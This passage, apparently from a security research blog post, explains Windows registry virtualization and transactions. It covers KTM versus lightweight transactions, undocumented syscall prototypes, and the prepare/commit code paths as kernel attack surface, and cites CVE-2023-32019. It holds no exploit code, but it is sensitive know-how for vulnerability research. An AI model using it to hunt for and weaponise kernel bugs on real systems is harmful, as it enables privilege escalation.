 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;And their example use:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;HANDLE&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;hToken;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;HKEY&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;hKey;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;// Enable virtualization for the token.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;(!OpenProcessToken(GetCurrentProcess(),&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;TOKEN_ALL_ACCESS,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;&amp;amp;hToken))&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;printf(&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c6&quot;&gt;&amp;quot;OpenProcessToken failed with error %u\n&amp;quot;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;GetLastError());&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c17&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c29&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c11 ujDEXfwdRL-c12&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;EnableTokenVirtualization(hToken,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;TRUE);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;// Enable virtualization for the key.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c20 ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;//&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;hKey&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;RegOpenKeyExW(...);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;EnableKeyVirtualization(hKey,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;/*VirtualTarget=*/&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;TRUE,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;/*VirtualStore=*/&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;TRUE,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c16&quot;&gt;/*VirtualSource=*/&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;FALSE);&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;ujDEXfwdRL-c24 ujDEXfwdRL-c11&quot; id=&quot;h.vh4ismyeqzq7&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c34 ujDEXfwdRL-c20&quot;&gt;Transactions&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;here are two types of registry transactions: KTM and lightweight.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The former are transactions implemented on top of the tm.sys (Transaction Manager) driver, and they try to provide certain guarantees of transactional atomicity both during system run time and even across reboots. The latter, as the name suggests, are lightweight transactions that exist only in memory and whose task is to provide an easy and quick way to ensure that a given set of registry operations is applied atomically.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As potential attackers, there are three parts of the interface that we are interested in the most: creating a transaction object, rolling back a transaction, and committing a transaction.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The functions responsible for all three actions in each type of transaction are shown in the table below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ujDEXfwdRL-c33&quot;&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c32 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Operation&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;KTM (API)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c31 ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;KTM (system call)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c18 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Lightweight (API)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c39 ujDEXfwdRL-c31&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c9 ujDEXfwdRL-c21&quot;&gt;Lightweight (system call)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Create transaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-createtransaction&quot;&gt;CreateTransaction&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCreateTransaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c18&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCreateRegistryTransaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Rollback transaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-rollbacktransaction&quot;&gt;RollbackTransaction&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtRollbackTransaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c18&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtRollbackRegistryTransaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;ujDEXfwdRL-c27&quot;&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;Commit transaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-committransaction&quot;&gt;CommitTransaction&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c32&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCommitTransaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c18&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;-&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;ujDEXfwdRL-c39&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ujDEXfwdRL-c22&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;NtCommitRegistryTransaction&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;As we can see, the &lt;/span&gt;&lt;span&gt;KTM has a public, documented API interface, which cannot be said for lightweight transactions that can only be used via syscalls.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Their definitions, however, are not too difficult to reverse engineer, and they come down to the following prototypes:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c1 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NtCreateRegistryTransaction(PHANDLE&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;OutputHandle,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ACCESS_MASK&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;DesiredAccess,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;POBJECT_ATTRIBUTES&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ObjectAttributes,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Reserved);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NtRollbackRegistryTransaction(HANDLE&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Handle,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Reserved);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NTSTATUS&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;NtCommitRegistryTransaction(HANDLE&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Handle,&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;ULONG&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c3 ujDEXfwdRL-c15&quot;&gt;Reserved);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c12 ujDEXfwdRL-c11&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;Upon the creation of a transaction object, whether of type TmTransactionObjectType (KTM) or CmRegistryTransactionType (lightweight), its subsequent usage becomes straightforward.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The transaction handle is passed to either the RegOpenKeyTransacted or the RegCreateKeyTransacted function, yielding a key handle.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The key&amp;#39;s internal properties, specifically the key body structure, will reflect its transactional nature.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Operations on this key proceed identically to the non-transactional case, using the same functions.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;However, changes are temporarily confined to the transaction context, isolated from the global registry view.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Upon the completion of all transactional operations, the user may elect either to discard the changes via a rollback, or apply them atomically through a commit.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;From the developer&amp;#39;s perspective, this interface is undeniably convenient.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;From an attack surface perspective, there&amp;#39;s a substantial amount of code underlying the transaction functionality.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Firstly, the handler for each base operation includes code to verify that the key isn&amp;#39;t locked by another transaction, to allocate and initialize a UoW (unit of work) object, and then write it to the internal structures that describe the transaction.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Secondly, to maintain consistency with the new functionality, the existing non-transactional code must first abort all transactions associated with a given key before it can be modified.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4 ujDEXfwdRL-c14&quot;&gt;&lt;span class=&quot;ujDEXfwdRL-c5&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ujDEXfwdRL-c4&quot;&gt;&lt;span&gt;But that&amp;#39;s not the end of the story.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The commit process itself is also complicated, as it must cleverly circumvent various registry limitations resulting from its original design.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In 2023, most of the code responsible for KTM transactions was removed as a result of &lt;/span&gt;&lt;span class=&quot;ujDEXfwdRL-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451576&quot;&gt;CVE-2023-32019&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, but there is still a second engine that was initially responsible for lightweight transactions and now handles all of them.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;It consists of two stages: &amp;quot;Prepare&amp;quot; and &amp;quot;Commit&amp;quot;. During the &lt;/span&gt;&lt;span&gt;prepare&lt;/span&gt;&lt;span&gt;&amp;nbsp;stage, all steps that could potentially fail are performed, such as allocating all necessary cells in the target hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;E&lt;/span&gt;&lt;span&gt;rrors are allowed and correctly handled in the prepare stage, because the globally visible state of the registry does not change yet.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is followed by the commit stage, which is designed so that nothing can go wrong &amp;ndash; it no longer performs any dynamic allocations or other complex operations, and its whole purpose is to update values in both the hive and the kernel descriptors so that transactional changes become globally visible.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The internal prepare handlers for each individual operation have names starting with &amp;quot;CmpLightWeightPrepare&amp;quot; (e.g., CmpLightWeightPrepareAddKeyUoW), while the corresponding commit handlers start with &amp;quot;CmpLightWeightCommit&amp;quot; (e.g., CmpLightWeightCommitAddKeyUoW).&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;These are the two main families of functions that are most interesting from a vulnerability research 